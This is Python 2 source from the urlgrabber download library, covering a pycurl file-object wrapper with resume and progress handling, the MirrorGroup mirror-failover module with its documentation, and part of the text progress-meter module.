        reget_length = 0
        rt = None
        if self.opts.reget and type(self.filename) in types.StringTypes:
            # we have reget turned on and we're dumping to a file
            try:
                s = os.stat(self.filename)
            except OSError:
                pass
            else:
                self.reget_time = s[stat.ST_MTIME]
                reget_length = s[stat.ST_SIZE]

                # Set initial length when regetting
                self._amount_read = reget_length    
                self._reget_length = reget_length # set where we started from, too

                rt = reget_length, ''
                self.append = 1
                
        if self.opts.range:
            rt = self.opts.range
            if rt[0]: rt = (rt[0] + reget_length, rt[1])

        if rt:
            header = range_tuple_to_header(rt)
            if header:
                return header.split('=')[1]



    def _make_request(self, req, opener):
        #XXXX
        # This doesn't do anything really, but we could use this
        # instead of do_open() to catch a lot of crap errors as 
        # mstenner did before here
        return (self.fo, self.hdr)
        
        try:
            if self.opts.timeout:
                old_to = socket.getdefaulttimeout()
                socket.setdefaulttimeout(self.opts.timeout)
                try:
                    fo = opener.open(req)
                finally:
                    socket.setdefaulttimeout(old_to)
            else:
                fo = opener.open(req)
            hdr = fo.info()
        except ValueError, e:
            err = URLGrabError(1, _('Bad URL: %s : %s') % (self.url, e, ))
            err.url = self.url
            raise err

        except RangeError, e:
            err = URLGrabError(9, _('%s on %s') % (e, self.url))
            err.url = self.url
            raise err
        except urllib2.HTTPError, e:
            new_e = URLGrabError(14, _('%s on %s') % (e, self.url))
            new_e.code = e.code
            new_e.exception = e
            new_e.url = self.url
            raise new_e
        except IOError, e:
            if hasattr(e, 'reason') and isinstance(e.reason, socket.timeout):
                err = URLGrabError(12, _('Timeout on %s: %s') % (self.url, e))
                err.url = self.url
                raise err
            else:
                err = URLGrabError(4, _('IOError on %s: %s') % (self.url, e))
                err.url = self.url
                raise err

        except OSError, e:
            err = URLGrabError(5, _('%s on %s') % (e, self.url))
            err.url = self.url
            raise err

        except HTTPException, e:
            err = URLGrabError(7, _('HTTP Exception (%s) on %s: %s') % \
                            (e.__class__.__name__, self.url, e))
            err.url = self.url
            raise err

        else:
            return (fo, hdr)
        
    def _do_grab(self):
        """dump the file to a filename or StringIO buffer"""

        if self._complete:
            return
        _was_filename = False
        if type(self.filename) in types.StringTypes and self.filename:
            _was_filename = True
            self._prog_reportname = str(self.filename)
            self._prog_basename = os.path.basename(self.filename)
            
            if self.append: mode = 'ab'
            else: mode = 'wb'

            if DEBUG: DEBUG.info('opening local file "%s" with mode %s' % \
                                 (self.filename, mode))
            try:
                self.fo = open(self.filename, mode)
            except IOError, e:
                err = URLGrabError(16, _(\
                  'error opening local file from %s, IOError: %s') % (self.url, e))
                err.url = self.url
                raise err

        else:
            self._prog_reportname = 'MEMORY'
            self._prog_basename = 'MEMORY'

            
            self.fo = StringIO()
            # if this is to be a tempfile instead....
            # it just makes crap in the tempdir
            #fh, self._temp_name = mkstemp()
            #self.fo = open(self._temp_name, 'wb')

            
        self._do_perform()
        


        if _was_filename:
            # close it up
            self.fo.flush()
            self.fo.close()
            # set the time
            mod_time = self.curl_obj.getinfo(pycurl.INFO_FILETIME)
            if mod_time != -1:
                os.utime(self.filename, (mod_time, mod_time))
            # re open it
            self.fo = open(self.filename, 'r')
        else:
            #self.fo = open(self._temp_name, 'r')
            self.fo.seek(0)

        self._complete = True
    
    def _fill_buffer(self, amt=None):
        """fill the buffer to contain at least 'amt' bytes by reading
        from the underlying file object.  If amt is None, then it will
        read until it gets nothing more.  It updates the progress meter
        and throttles after every self._rbufsize bytes."""
        # the _rbuf test is only in this first 'if' for speed.  It's not
        # logically necessary
        if self._rbuf and not amt is None:
            L = len(self._rbuf)
            if amt > L:
                amt = amt - L
            else:
                return

        # if we've made it here, then we don't have enough in the buffer
        # and we need to read more.
        
        if not self._complete: self._do_grab() #XXX cheater - change on ranges
        
        buf = [self._rbuf]
        bufsize = len(self._rbuf)
        while amt is None or amt:
            # first, delay if necessary for throttling reasons
            if self.opts.raw_throttle():
                diff = self._tsize/self.opts.raw_throttle() - \
                       (time.time() - self._ttime)
                if diff > 0: time.sleep(diff)
                self._ttime = time.time()
                
            # now read some data, up to self._rbufsize
            if amt is None: readamount = self._rbufsize
            else:           readamount = min(amt, self._rbufsize)
            try:
                new = self.fo.read(readamount)
            except socket.error, e:
                err = URLGrabError(4, _('Socket Error on %s: %s') % (self.url, e))
                err.url = self.url
                raise err

            except socket.timeout, e:
                raise URLGrabError(12, _('Timeout on %s: %s') % (self.url, e))
                err.url = self.url
                raise err

            except IOError, e:
                raise URLGrabError(4, _('IOError on %s: %s') %(self.url, e))
                err.url = self.url
                raise err

            newsize = len(new)
            if not newsize: break # no more to read

            if amt: amt = amt - newsize
            buf.append(new)
            bufsize = bufsize + newsize
            self._tsize = newsize
            self._amount_read = self._amount_read + newsize
            #if self.opts.progress_obj:
            #    self.opts.progress_obj.update(self._amount_read)

        self._rbuf = string.join(buf, '')
        return

    def _progress_update(self, download_total, downloaded, upload_total, uploaded):
        if self._over_max_size(cur=self._amount_read-self._reget_length):
            return -1

        try:
            if self._prog_running:
                downloaded += self._reget_length
                self.opts.progress_obj.update(downloaded)
        except KeyboardInterrupt:
            return -1
    
    def _over_max_size(self, cur, max_size=None):

        if not max_size:
            max_size = self.size
        if self.opts.size: # if we set an opts size use that, no matter what
            max_size = self.opts.size
        if not max_size: return False # if we have None for all of the Max then this is dumb
        if cur > max_size + max_size*.10:

            msg = _("Downloaded more than max size for %s: %s > %s") \
                        % (self.url, cur, max_size)
            self._error = (pycurl.E_FILESIZE_EXCEEDED, msg)
            return True
        return False
        
    def _to_utf8(self, obj, errors='replace'):
        '''convert 'unicode' to an encoded utf-8 byte string '''
        # stolen from yum.i18n
        if isinstance(obj, unicode):
            obj = obj.encode('utf-8', errors)
        return obj
        
    def read(self, amt=None):
        self._fill_buffer(amt)
        if amt is None:
            s, self._rbuf = self._rbuf, ''
        else:
            s, self._rbuf = self._rbuf[:amt], self._rbuf[amt:]
        return s

    def readline(self, limit=-1):
        if not self._complete: self._do_grab()
        return self.fo.readline()
        
        i = string.find(self._rbuf, '\n')
        while i < 0 and not (0 < limit <= len(self._rbuf)):
            L = len(self._rbuf)
            self._fill_buffer(L + self._rbufsize)
            if not len(self._rbuf) > L: break
            i = string.find(self._rbuf, '\n', L)

        if i < 0: i = len(self._rbuf)
        else: i = i+1
        if 0 <= limit < len(self._rbuf): i = limit

        s, self._rbuf = self._rbuf[:i], self._rbuf[i:]
        return s

    def close(self):
        if self._prog_running:
            self.opts.progress_obj.end(self._amount_read)
        self.fo.close()
        

_curl_cache = pycurl.Curl() # make one and reuse it over and over and over


#####################################################################
# DEPRECATED FUNCTIONS
def set_throttle(new_throttle):
    """Deprecated. Use: default_grabber.throttle = new_throttle"""
    default_grabber.throttle = new_throttle

def set_bandwidth(new_bandwidth):
    """Deprecated. Use: default_grabber.bandwidth = new_bandwidth"""
    default_grabber.bandwidth = new_bandwidth

def set_progress_obj(new_progress_obj):
    """Deprecated. Use: default_grabber.progress_obj = new_progress_obj"""
    default_grabber.progress_obj = new_progress_obj

def set_user_agent(new_user_agent):
    """Deprecated. Use: default_grabber.user_agent = new_user_agent"""
    default_grabber.user_agent = new_user_agent
    
def retrygrab(url, filename=None, copy_local=0, close_connection=0,
              progress_obj=None, throttle=None, bandwidth=None,
              numtries=3, retrycodes=[-1,2,4,5,6,7], checkfunc=None):
    """Deprecated. Use: urlgrab() with the retry arg instead"""
    kwargs = {'copy_local' :  copy_local, 
              'close_connection' : close_connection,
              'progress_obj' : progress_obj, 
              'throttle' : throttle, 
              'bandwidth' : bandwidth,
              'retry' : numtries,
              'retrycodes' : retrycodes,
              'checkfunc' : checkfunc 
              }
    return urlgrab(url, filename, **kwargs)

        
#####################################################################
#  TESTING
def _main_test():
    try: url, filename = sys.argv[1:3]
    except ValueError:
        print 'usage:', sys.argv[0], \
              '<url> <filename> [copy_local=0|1] [close_connection=0|1]'
        sys.exit()

    kwargs = {}
    for a in sys.argv[3:]:
        k, v = string.split(a, '=', 1)
        kwargs[k] = int(v)

    set_throttle(1.0)
    set_bandwidth(32 * 1024)
    print "throttle: %s,  throttle bandwidth: %s B/s" % (default_grabber.throttle, 
                                                        default_grabber.bandwidth)

    try: from progress import text_progress_meter
    except ImportError, e: pass
    else: kwargs['progress_obj'] = text_progress_meter()

    try: name = apply(urlgrab, (url, filename), kwargs)
    except URLGrabError, e: print e
    else: print 'LOCAL FILE:', name


def _retry_test():
    try: url, filename = sys.argv[1:3]
    except ValueError:
        print 'usage:', sys.argv[0], \
              '<url> <filename> [copy_local=0|1] [close_connection=0|1]'
        sys.exit()

    kwargs = {}
    for a in sys.argv[3:]:
        k, v = string.split(a, '=', 1)
        kwargs[k] = int(v)

    try: from progress import text_progress_meter
    except ImportError, e: pass
    else: kwargs['progress_obj'] = text_progress_meter()

    def cfunc(filename, hello, there='foo'):
        print hello, there
        import random
        rnum = random.random()
        if rnum < .5:
            print 'forcing retry'
            raise URLGrabError(-1, 'forcing retry')
        if rnum < .75:
            print 'forcing failure'
            raise URLGrabError(-2, 'forcing immediate failure')
        print 'success'
        return
        
    kwargs['checkfunc'] = (cfunc, ('hello',), {'there':'there'})
    try: name = apply(retrygrab, (url, filename), kwargs)
    except URLGrabError, e: print e
    else: print 'LOCAL FILE:', name

def _file_object_test(filename=None):
    import cStringIO
    if filename is None:
        filename = __file__
    print 'using file "%s" for comparisons' % filename
    fo = open(filename)
    s_input = fo.read()
    fo.close()

    for testfunc in [_test_file_object_smallread,
                     _test_file_object_readall,
                     _test_file_object_readline,
                     _test_file_object_readlines]:
        fo_input = cStringIO.StringIO(s_input)
        fo_output = cStringIO.StringIO()
        wrapper = PyCurlFileObject(fo_input, None, 0)
        print 'testing %-30s ' % testfunc.__name__,
        testfunc(wrapper, fo_output)
        s_output = fo_output.getvalue()
        if s_output == s_input: print 'passed'
        else: print 'FAILED'
            
def _test_file_object_smallread(wrapper, fo_output):
    while 1:
        s = wrapper.read(23)
        fo_output.write(s)
        if not s: return

def _test_file_object_readall(wrapper, fo_output):
    s = wrapper.read()
    fo_output.write(s)

def _test_file_object_readline(wrapper, fo_output):
    while 1:
        s = wrapper.readline()
        fo_output.write(s)
        if not s: return

def _test_file_object_readlines(wrapper, fo_output):
    li = wrapper.readlines()
    fo_output.write(string.join(li, ''))

if __name__ == '__main__':
    _main_test()
    _retry_test()
    _file_object_test('test')

########NEW FILE########
__FILENAME__ = mirror
#   This library is free software; you can redistribute it and/or
#   modify it under the terms of the GNU Lesser General Public
#   License as published by the Free Software Foundation; either
#   version 2.1 of the License, or (at your option) any later version.
#
#   This library is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
#   Lesser General Public License for more details.
#
#   You should have received a copy of the GNU Lesser General Public
#   License along with this library; if not, write to the 
#      Free Software Foundation, Inc., 
#      59 Temple Place, Suite 330, 
#      Boston, MA  02111-1307  USA

# This file is part of urlgrabber, a high-level cross-protocol url-grabber
# Copyright 2002-2004 Michael D. Stenner, Ryan Tomayko

"""Module for downloading files from a pool of mirrors

DESCRIPTION

  This module provides support for downloading files from a pool of
  mirrors with configurable failover policies.  To a large extent, the
  failover policy is chosen by using different classes derived from
  the main class, MirrorGroup.

  Instances of MirrorGroup (and cousins) act very much like URLGrabber
  instances in that they have urlread, urlgrab, and urlopen methods.
  They can therefore, be used in very similar ways.

    from urlgrabber.grabber import URLGrabber
    from urlgrabber.mirror import MirrorGroup
    gr = URLGrabber()
    mg = MirrorGroup(gr, ['http://foo.com/some/directory/',
                          'http://bar.org/maybe/somewhere/else/',
                          'ftp://baz.net/some/other/place/entirely/']
    mg.urlgrab('relative/path.zip')

  The assumption is that all mirrors are identical AFTER the base urls
  specified, so that any mirror can be used to fetch any file.

FAILOVER

  The failover mechanism is designed to be customized by subclassing
  from MirrorGroup to change the details of the behavior.  In general,
  the classes maintain a master mirror list and a "current mirror"
  index.  When a download is initiated, a copy of this list and index
  is created for that download only.  The specific failover policy
  depends on the class used, and so is documented in the class
  documentation.  Note that ANY behavior of the class can be
  overridden, so any failover policy at all is possible (although
  you may need to change the interface in extreme cases).

CUSTOMIZATION

  Most customization of a MirrorGroup object is done at instantiation
  time (or via subclassing).  There are four major types of
  customization:

    1) Pass in a custom urlgrabber - The passed in urlgrabber will be
       used (by default... see #2) for the grabs, so options to it
       apply for the url-fetching

    2) Custom mirror list - Mirror lists can simply be a list of
       stings mirrors (as shown in the example above) but each can
       also be a dict, allowing for more options.  For example, the
       first mirror in the list above could also have been:

         {'mirror': 'http://foo.com/some/directory/',
          'grabber': <a custom grabber to be used for this mirror>,
          'kwargs': { <a dict of arguments passed to the grabber> }}

       All mirrors are converted to this format internally.  If
       'grabber' is omitted, the default grabber will be used.  If
       kwargs are omitted, then (duh) they will not be used.

    3) Pass keyword arguments when instantiating the mirror group.
       See, for example, the failure_callback argument.

    4) Finally, any kwargs passed in for the specific file (to the
       urlgrab method, for example) will be folded in.  The options
       passed into the grabber's urlXXX methods will override any
       options specified in a custom mirror dict.

"""


import random
import thread  # needed for locking to make this threadsafe

from grabber import URLGrabError, CallbackObject, DEBUG

def _(st): 
    return st

class GrabRequest:
    """This is a dummy class used to hold information about the specific
    request.  For example, a single file.  By maintaining this information
    separately, we can accomplish two things:

      1) make it a little easier to be threadsafe
      2) have request-specific parameters
    """
    pass

class MirrorGroup:
    """Base Mirror class

    Instances of this class are built with a grabber object and a list
    of mirrors.  Then all calls to urlXXX should be passed relative urls.
    The requested file will be searched for on the first mirror.  If the
    grabber raises an exception (possibly after some retries) then that
    mirror will be removed from the list, and the next will be attempted.
    If all mirrors are exhausted, then an exception will be raised.

    MirrorGroup has the following failover policy:

      * downloads begin with the first mirror

      * by default (see default_action below) a failure (after retries)
        causes it to increment the local AND master indices.  Also,
        the current mirror is removed from the local list (but NOT the
        master list - the mirror can potentially be used for other
        files)

      * if the local list is ever exhausted, a URLGrabError will be
        raised (errno=256, no more mirrors)

    OPTIONS

      In addition to the required arguments "grabber" and "mirrors",
      MirrorGroup also takes the following optional arguments:
      
      default_action

        A dict that describes the actions to be taken upon failure
        (after retries).  default_action can contain any of the
        following keys (shown here with their default values):

          default_action = {'increment': 1,
                            'increment_master': 1,
                            'remove': 1,
                            'remove_master': 0,
                            'fail': 0}

        In this context, 'increment' means "use the next mirror" and
        'remove' means "never use this mirror again".  The two
        'master' values refer to the instance-level mirror list (used
        for all files), whereas the non-master values refer to the
        current download only.

        The 'fail' option will cause immediate failure by re-raising
        the exception and no further attempts to get the current
        download.

        This dict can be set at instantiation time,
          mg = MirrorGroup(grabber, mirrors, default_action={'fail':1})
        at method-execution time (only applies to current fetch),
          filename = mg.urlgrab(url, default_action={'increment': 0})
        or by returning an action dict from the failure_callback
          return {'fail':0}
        in increasing precedence.
        
        If all three of these were done, the net result would be:
              {'increment': 0,         # set in method
               'increment_master': 1,  # class default
               'remove': 1,            # class default
               'remove_master': 0,     # class default
               'fail': 0}              # set at instantiation, reset
                                       # from callback

      failure_callback

        this is a callback that will be called when a mirror "fails",
        meaning the grabber raises some URLGrabError.  If this is a
        tuple, it is interpreted to be of the form (cb, args, kwargs)
        where cb is the actual callable object (function, method,
        etc).  Otherwise, it is assumed to be the callable object
        itself.  The callback will be passed a grabber.CallbackObject
        instance along with args and kwargs (if present).  The following
        attributes are defined withing the instance:

           obj.exception    = < exception that was raised >
           obj.mirror       = < the mirror that was tried >
           obj.relative_url = < url relative to the mirror >
           obj.url          = < full url that failed >
                              # .url is just the combination of .mirror
                              # and .relative_url

        The failure callback can return an action dict, as described
        above.

        Like default_action, the failure_callback can be set at
        instantiation time or when the urlXXX method is called.  In
        the latter case, it applies only for that fetch.

        The callback can re-raise the exception quite easily.  For
        example, this is a perfectly adequate callback function:

          def callback(obj): raise obj.exception

        WARNING: do not save the exception object (or the
        CallbackObject instance).  As they contain stack frame
        references, they can lead to circular references.

    Notes:
      * The behavior can be customized by deriving and overriding the
        'CONFIGURATION METHODS'
      * The 'grabber' instance is kept as a reference, not copied.
        Therefore, the grabber instance can be modified externally
        and changes will take effect immediately.
    """

    # notes on thread-safety:

    #   A GrabRequest should never be shared by multiple threads because
    #   it's never saved inside the MG object and never returned outside it.
    #   therefore, it should be safe to access/modify grabrequest data
    #   without a lock.  However, accessing the mirrors and _next attributes
    #   of the MG itself must be done when locked to prevent (for example)
    #   removal of the wrong mirror.

    ##############################################################
    #  CONFIGURATION METHODS  -  intended to be overridden to
    #                            customize behavior
    def __init__(self, grabber, mirrors, **kwargs):
        """Initialize the MirrorGroup object.

        REQUIRED ARGUMENTS

          grabber  - URLGrabber instance
          mirrors  - a list of mirrors

        OPTIONAL ARGUMENTS

          failure_callback  - callback to be used when a mirror fails
          default_action    - dict of failure actions

        See the module-level and class level documentation for more
        details.
        """

        # OVERRIDE IDEAS:
        #   shuffle the list to randomize order
        self.grabber = grabber
        self.mirrors = self._parse_mirrors(mirrors)
        self._next = 0
        self._lock = thread.allocate_lock()
        self.default_action = None
        self._process_kwargs(kwargs)

    # if these values are found in **kwargs passed to one of the urlXXX
    # methods, they will be stripped before getting passed on to the
    # grabber
    options = ['default_action', 'failure_callback']
    
    def _process_kwargs(self, kwargs):
        self.failure_callback = kwargs.get('failure_callback')
        self.default_action   = kwargs.get('default_action')
       
    def _parse_mirrors(self, mirrors):
        parsed_mirrors = []
        for m in mirrors:
            if type(m) == type(''): m = {'mirror': m}
            parsed_mirrors.append(m)
        return parsed_mirrors
    
    def _load_gr(self, gr):
        # OVERRIDE IDEAS:
        #   shuffle gr list
        self._lock.acquire()
        gr.mirrors = list(self.mirrors)
        gr._next = self._next
        self._lock.release()

    def _get_mirror(self, gr):
        # OVERRIDE IDEAS:
        #   return a random mirror so that multiple mirrors get used
        #   even without failures.
        if not gr.mirrors:
            raise URLGrabError(256, _('No more mirrors to try.'))
        return gr.mirrors[gr._next]

    def _failure(self, gr, cb_obj):
        # OVERRIDE IDEAS:
        #   inspect the error - remove=1 for 404, remove=2 for connection
        #                       refused, etc. (this can also be done via
        #                       the callback)
        cb = gr.kw.get('failure_callback') or self.failure_callback
        if cb:
            if type(cb) == type( () ):
                cb, args, kwargs = cb
            else:
                args, kwargs = (), {}
            action = cb(cb_obj, *args, **kwargs) or {}
        else:
            action = {}
        # XXXX - decide - there are two ways to do this
        # the first is action-overriding as a whole - use the entire action
        # or fall back on module level defaults
        #action = action or gr.kw.get('default_action') or self.default_action
        # the other is to fall through for each element in the action dict
        a = dict(self.default_action or {})
        a.update(gr.kw.get('default_action', {}))
        a.update(action)
        action = a
        self.increment_mirror(gr, action)
        if action and action.get('fail', 0): raise

    def increment_mirror(self, gr, action={}):
        """Tell the mirror object increment the mirror index

        This increments the mirror index, which amounts to telling the
        mirror object to use a different mirror (for this and future
        downloads).

        This is a SEMI-public method.  It will be called internally,
        and you may never need to call it.  However, it is provided
        (and is made public) so that the calling program can increment
        the mirror choice for methods like urlopen.  For example, with
        urlopen, there's no good way for the mirror group to know that
        an error occurs mid-download (it's already returned and given
        you the file object).
        
        remove  ---  can have several values
           0   do not remove the mirror from the list
           1   remove the mirror for this download only
           2   remove the mirror permanently

        beware of remove=0 as it can lead to infinite loops
        """
        badmirror = gr.mirrors[gr._next]

        self._lock.acquire()
        try:
            ind = self.mirrors.index(badmirror)
        except ValueError:
            pass
        else:
            if action.get('remove_master', 0):
                del self.mirrors[ind]
            elif self._next == ind and action.get('increment_master', 1):
                self._next += 1
            if self._next >= len(self.mirrors): self._next = 0
        self._lock.release()
        
        if action.get('remove', 1):
            del gr.mirrors[gr._next]
        elif action.get('increment', 1):
            gr._next += 1
        if gr._next >= len(gr.mirrors): gr._next = 0

        if DEBUG:
            grm = [m['mirror'] for m in gr.mirrors]
            DEBUG.info('GR   mirrors: [%s] %i', ' '.join(grm), gr._next)
            selfm = [m['mirror'] for m in self.mirrors]
            DEBUG.info('MAIN mirrors: [%s] %i', ' '.join(selfm), self._next)

    #####################################################################
    # NON-CONFIGURATION METHODS
    # these methods are designed to be largely workhorse methods that
    # are not intended to be overridden.  That doesn't mean you can't;
    # if you want to, feel free, but most things can be done by
    # by overriding the configuration methods :)

    def _join_url(self, base_url, rel_url):
        if base_url.endswith('/') or rel_url.startswith('/'):
            return base_url + rel_url
        else:
            return base_url + '/' + rel_url
        
    def _mirror_try(self, func, url, kw):
        gr = GrabRequest()
        gr.func = func
        gr.url  = url
        gr.kw   = dict(kw)
        self._load_gr(gr)

        for k in self.options:
            try: del kw[k]
            except KeyError: pass

        while 1:
            mirrorchoice = self._get_mirror(gr)
            fullurl = self._join_url(mirrorchoice['mirror'], gr.url)
            kwargs = dict(mirrorchoice.get('kwargs', {}))
            kwargs.update(kw)
            grabber = mirrorchoice.get('grabber') or self.grabber
            func_ref = getattr(grabber, func)
            if DEBUG: DEBUG.info('MIRROR: trying %s -> %s', url, fullurl)
            try:
                return func_ref( *(fullurl,), **kwargs )
            except URLGrabError, e:
                if DEBUG: DEBUG.info('MIRROR: failed')
                obj = CallbackObject()
                obj.exception = e
                obj.mirror = mirrorchoice['mirror']
                obj.relative_url = gr.url
                obj.url = fullurl
                self._failure(gr, obj)

    def urlgrab(self, url, filename=None, **kwargs):
        kw = dict(kwargs)
        kw['filename'] = filename
        func = 'urlgrab'
        return self._mirror_try(func, url, kw)
    
    def urlopen(self, url, **kwargs):
        kw = dict(kwargs)
        func = 'urlopen'
        return self._mirror_try(func, url, kw)

    def urlread(self, url, limit=None, **kwargs):
        kw = dict(kwargs)
        kw['limit'] = limit
        func = 'urlread'
        return self._mirror_try(func, url, kw)
            

class MGRandomStart(MirrorGroup):
    """A mirror group that starts at a random mirror in the list.

    This behavior of this class is identical to MirrorGroup, except that
    it starts at a random location in the mirror list.
    """

    def __init__(self, grabber, mirrors, **kwargs):
        """Initialize the object

        The arguments for intialization are the same as for MirrorGroup
        """
        MirrorGroup.__init__(self, grabber, mirrors, **kwargs)
        self._next = random.randrange(len(mirrors))

class MGRandomOrder(MirrorGroup):
    """A mirror group that uses mirrors in a random order.

    This behavior of this class is identical to MirrorGroup, except that
    it uses the mirrors in a random order.  Note that the order is set at
    initialization time and fixed thereafter.  That is, it does not pick a
    random mirror after each failure.
    """

    def __init__(self, grabber, mirrors, **kwargs):
        """Initialize the object

        The arguments for intialization are the same as for MirrorGroup
        """
        MirrorGroup.__init__(self, grabber, mirrors, **kwargs)
        random.shuffle(self.mirrors)

if __name__ == '__main__':
    pass

########NEW FILE########
__FILENAME__ = progress
#   This library is free software; you can redistribute it and/or
#   modify it under the terms of the GNU Lesser General Public
#   License as published by the Free Software Foundation; either
#   version 2.1 of the License, or (at your option) any later version.
#
#   This library is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
#   Lesser General Public License for more details.
#
#   You should have received a copy of the GNU Lesser General Public
#   License along with this library; if not, write to the 
#      Free Software Foundation, Inc., 
#      59 Temple Place, Suite 330, 
#      Boston, MA  02111-1307  USA

# This file is part of urlgrabber, a high-level cross-protocol url-grabber
# Copyright 2002-2004 Michael D. Stenner, Ryan Tomayko


import sys
import time
import math
import thread
import fcntl
import struct
import termios

# Code from http://mail.python.org/pipermail/python-list/2000-May/033365.html
def terminal_width(fd=1):
    """ Get the real terminal width """
    try:
        buf = 'abcdefgh'
        buf = fcntl.ioctl(fd, termios.TIOCGWINSZ, buf)
        ret = struct.unpack('hhhh', buf)[1]
        if ret == 0:
            return 80
        # Add minimum too?
        return ret
    except: # IOError
        return 80

_term_width_val  = None
_term_width_last = None
def terminal_width_cached(fd=1, cache_timeout=1.000):
    """ Get the real terminal width, but cache it for a bit. """
    global _term_width_val
    global _term_width_last

    now = time.time()
    if _term_width_val is None or (now - _term_width_last) > cache_timeout:
        _term_width_val  = terminal_width(fd)
        _term_width_last = now
    return _term_width_val

class TerminalLine:
    """ Help create dynamic progress bars, uses terminal_width_cached(). """

    def __init__(self, min_rest=0, beg_len=None, fd=1, cache_timeout=1.000):
        if beg_len is None:
            beg_len = min_rest
        self._min_len = min_rest
        self._llen    = terminal_width_cached(fd, cache_timeout)
        if self._llen < beg_len:
            self._llen = beg_len
        self._fin = False

    def __len__(self):
        """ Usable length for elements. """
        return self._llen - self._min_len

    def rest_split(self, fixed, elements=2):
        """ After a fixed length, split the rest of the line length among
            a number of different elements (default=2). """
        if self._llen < fixed:
            return 0
        return (self._llen - fixed) / elements

    def add(self, element, full_len=None):
        """ If there is room left in the line, above min_len, add element.
            Note that as soon as one add fails all the rest will fail too. """

        if full_len is None:
            full_len = len(element)
        if len(self) < full_len:
            self._fin = True
        if self._fin:
            return ''

        self._llen -= len(element)
        return element

    def rest(self):
        """ Current rest of line, same as .rest_split(fixed=0, elements=1). """
        return self._llen

class BaseMeter:
    def __init__(self):
        self.update_period = 0.3 # seconds

        self.filename   = None
        self.url        = None
        self.basename   = None
        self.text       = None
        self.size       = None
        self.start_time = None
        self.last_amount_read = 0
        self.last_update_time = None
        self.re = RateEstimator()
        
    def start(self, filename=None, url=None, basename=None,
              size=None, now=None, text=None):
        self.filename = filename
        self.url      = url
        self.basename = basename
        self.text     = text

        #size = None #########  TESTING
        self.size = size
        if not size is None: self.fsize = format_number(size) + 'B'

        if now is None: now = time.time()
        self.start_time = now
        self.re.start(size, now)
        self.last_amount_read = 0
        self.last_update_time = now
        self._do_start(now)
        
    def _do_start(self, now=None):
        pass

    def update(self, amount_read, now=None):
        # for a real gui, you probably want to override and put a call
        # to your mainloop iteration function here
        if now is None: now = time.time()
        if (now >= self.last_update_time + self.update_period) or \
               not self.last_update_time:
            self.re.update(amount_read, now)
            self.last_amount_read = amount_read
            self.last_update_time = now
            self._do_update(amount_read, now)

    def _do_update(self, amount_read, now=None):
        pass

    def end(self, amount_read, now=None):
        if now is None: now = time.time()
        self.re.update(amount_read, now)
        self.last_amount_read = amount_read
        self.last_update_time = now
        self._do_end(amount_read, now)

    def _do_end(self, amount_read, now=None):
        pass
        
#  This is kind of a hack, but progress is gotten from grabber which doesn't
# know about the total size to download. So we do this so we can get the data
# out of band here. This will be "fixed" one way or anther soon.
_text_meter_total_size = 0
_text_meter_sofar_size = 0
def text_meter_total_size(size, downloaded=0):
    global _text_meter_total_size
    global _text_meter_sofar_size
    _text_meter_total_size = size
    _text_meter_sofar_size = downloaded

#
#       update: No size (minimal: 17 chars)
#       -----------------------------------
# <text>                          <rate> | <current size> <elapsed time> 
#  8-48                          1    8  3             6 1            9 5
#
# Order: 1. <text>+<current size> (17)
#        2. +<elapsed time>       (10, total: 27)
#        3. +                     ( 5, total: 32)
#        4. +<rate>               ( 9, total: 41)
#
#       update: Size, Single file
#       -------------------------
# <text>            <pc>  <bar> <rate> | <current size> <eta time> ETA
#  8-25            1 3-4 1 6-16 1   8  3             6 1        9 1  3 1
#
# Order: 1. <text>+<current size> (17)
#        2. +<eta time>           (10, total: 27)
#        3. +ETA                  ( 5, total: 32)
#        4. +<pc>                 ( 4, total: 36)
#        5. +<rate>               ( 9, total: 45)
#        6. +<bar>                ( 7, total: 52)
#
#       update: Size, All files
#       -----------------------
# <text> <total pc> <pc>  <bar> <rate> | <current size> <eta time> ETA
#  8-22 1      5-7 1 3-4 1 6-12 1   8  3             6 1        9 1  3 1
#
# Order: 1. <text>+<current size> (17)
#        2. +<eta time>           (10, total: 27)
#        3. +ETA                  ( 5, total: 32)
#        4. +<total pc>           ( 5, total: 37)
#        4. +<pc>                 ( 4, total: 41)
#        5. +<rate>               ( 9, total: 50)
#        6. +<bar>                ( 7, total: 57)
#
#       end
#       ---
# <text>                                 | <current size> <elapsed time> 
#  8-56                                  3             6 1            9 5
#
# Order: 1. <text>                ( 8)
#        2. +<current size>       ( 9, total: 17)
#        3. +<elapsed time>       (10, total: 27)
#        4. +                     ( 5, total: 32)
#

class TextMeter(BaseMeter):
    def __init__(self, fo=sys.stderr):
        BaseMeter.__init__(self)
        self.fo = fo

    def _do_update(self, amount_read, now=None):
        etime = self.re.elapsed_time()
        fetime = format_time(etime)
        fread = format_number(amount_read)
        #self.size = None
        if self.text is not None:
            text = self.text
        else:
            text = self.basename

        ave_dl = format_number(self.re.average_rate())
        sofar_size = None
        if _text_meter_total_size:
            sofar_size = _text_meter_sofar_size + amount_read
            sofar_pc   = (sofar_size * 100) / _text_meter_total_size

        # Include text + ui_rate in minimal
        tl = TerminalLine(8, 8+1+8)
        ui_size = tl.add(' | %5sB' % fread)
        if self.size is None:
            ui_time = tl.add(' %9s' % fetime)
            ui_end  = tl.add(' ' * 5)
            ui_rate = tl.add(' %5sB/s' % ave_dl)
            out = '%-*.*s%s%s%s%s\r' % (tl.rest(), tl.rest(), text,
                                        ui_rate, ui_size, ui_time, ui_end)
        else:
            rtime = self.re.remaining_time()
            frtime = format_time(rtime)
            frac = self.re.fraction_read()

            ui_time = tl.add(' %9s' % frtime)
            ui_end  = tl.add(' ETA ')

            if sofar_size is None:
                ui_sofar_pc = ''
            else:
                ui_sofar_pc = tl.add(' (%i%%)' % sofar_pc,
                                     full_len=len(" (100%)"))

            ui_pc   = tl.add(' %2i%%' % (frac*100))
            ui_rate = tl.add(' %5sB/s' % ave_dl)
            # Make text grow a bit before we start growing the bar too
            blen = 4 + tl.rest_split(8 + 8 + 4)
            bar  = '='*int(blen * frac)
            if (blen * frac) - int(blen * frac) >= 0.5:
                bar += '-'
            ui_bar  = tl.add(' [%-*.*s]' % (blen, blen, bar))
            out = '%-*.*s%s%s%s%s%s%s%s\r' % (tl.rest(), tl.rest(), text,
                                              ui_sofar_pc, ui_pc, ui_bar,
                                              ui_rate, ui_size, ui_time, ui_end)

        self.fo.write(out)
        self.fo.flush()

